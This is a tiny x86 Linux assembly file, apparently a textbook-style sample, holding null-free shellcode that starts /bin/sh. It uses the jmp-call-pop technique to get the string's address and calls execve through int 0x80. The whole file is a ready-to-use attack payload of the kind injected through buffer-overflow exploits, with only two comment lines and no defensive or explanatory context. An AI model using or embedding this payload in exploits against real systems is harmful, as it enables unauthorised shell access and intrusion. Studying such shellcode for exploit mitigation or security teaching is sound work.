; Basic shellcode for opening a shell.
; The assembled code of it contains no nullbytes
jmp caller

open_shell:
    pop ebx
    push ebx

    push 0xb
    pop eax
    xor ecx, ecx
    xor edx, edx
    int 0x80

caller:
    call open_shell
    .asciz "/bin/sh"
